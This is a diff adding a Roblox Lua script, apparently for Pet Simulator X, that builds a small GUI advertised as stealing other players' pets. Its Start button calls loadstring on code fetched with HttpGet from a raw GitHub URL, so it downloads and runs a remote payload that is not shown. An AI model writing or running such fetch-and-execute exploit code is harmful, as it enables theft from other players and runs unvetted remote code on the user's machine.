@@ -1,0 +1,54 @@
+-- PetSimulatorX Stealing Pets|Made By BurgerKaSakin
+
+
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local name = Instance.new("TextBox")
+local stealpets = Instance.new("TextLabel")
+local Start = Instance.new("TextButton")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+main.Position = UDim2.new(0.3688142, 0, 0.210735589, 0)
+main.Size = UDim2.new(0, 202, 0, 156)
+main.Active = true
+main.Draggable = true
+
+name.Name = "Phuriwat343112"
+name.Parent = main
+name.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+name.Position = UDim2.new(0.00495049497, 0, 0.333333343, 0)
+name.Size = UDim2.new(0, 201, 0, 52)
+name.Font = Enum.Font.SourceSans
+name.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
+name.Text = "\"Put Name\""
+name.TextColor3 = Color3.fromRGB(255, 255, 255)
+name.TextSize = 26.000
+
+stealpets.Name = "steal pets"
+stealpets.Parent = main
+stealpets.BackgroundColor3 = Color3.fromRGB(0, 46, 255)
+stealpets.Size = UDim2.new(0, 201, 0, 52)
+stealpets.Font = Enum.Font.SourceSans
+stealpets.Text = "stealing pets | Made By BurgerKaSakin"
+stealpets.TextColor3 = Color3.fromRGB(0, 0, 0)
+stealpets.TextSize = 13.000
+
+Start.Name = "Start"
+Start.Parent = main
+Start.BackgroundColor3 = Color3.fromRGB(0, 255, 8)
+Start.Position = UDim2.new(0, 0, 0.679487169, 0)
+Start.Size = UDim2.new(0, 202, 0, 50)
+Start.Font = Enum.Font.SourceSans
+Start.Text = "\"Start\""
+Start.TextColor3 = Color3.fromRGB(0, 0, 0)
+Start.TextSize = 36.000
+Start.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/babyalien0u/project-1-/main/PetSimulatorXStealPets(1)"))()
+end)
